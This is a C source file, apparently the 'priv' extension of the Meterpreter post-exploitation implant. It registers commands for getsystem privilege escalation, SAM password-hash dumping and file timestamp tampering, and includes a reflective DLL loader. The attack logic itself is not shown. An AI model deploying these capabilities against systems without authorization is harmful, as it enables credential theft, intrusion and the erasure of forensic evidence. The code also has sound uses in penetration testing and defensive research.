/*!
 * @brief This module implements privilege escalation features.
 */
#include "precomp.h"

// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

#define PRIV_ELEVATE_GETSYSTEM 3000
#define PRIV_FS_BLANK_DIRECTORY_MACE 3001
#define PRIV_FS_BLANK_FILE_MACE 3002
#define PRIV_FS_GET_FILE_MACE 3003
#define PRIV_FS_SET_FILE_MACE 3004
#define PRIV_FS_SET_FILE_MACE_FROM_FILE 3005
#define PRIV_PASSWD_GET_SAM_HASHES 3006

/*!
 * @brief `priv` extension dispatch table.
 */
Command customCommands[] =
{
	COMMAND_REQ(PRIV_ELEVATE_GETSYSTEM, elevate_getsystem),
	COMMAND_REQ(PRIV_PASSWD_GET_SAM_HASHES, request_passwd_get_sam_hashes),
	COMMAND_REQ(PRIV_FS_GET_FILE_MACE, request_fs_get_file_mace),
	COMMAND_REQ(PRIV_FS_SET_FILE_MACE, request_fs_set_file_mace),
	COMMAND_REQ(PRIV_FS_SET_FILE_MACE_FROM_FILE, request_fs_set_file_mace_from_file),
	COMMAND_REQ(PRIV_FS_BLANK_FILE_MACE, request_fs_blank_file_mace),
	COMMAND_REQ(PRIV_FS_BLANK_DIRECTORY_MACE, request_fs_blank_directory_mace),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	command_register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "priv", bufferSize - 1);
	return ERROR_SUCCESS;
}
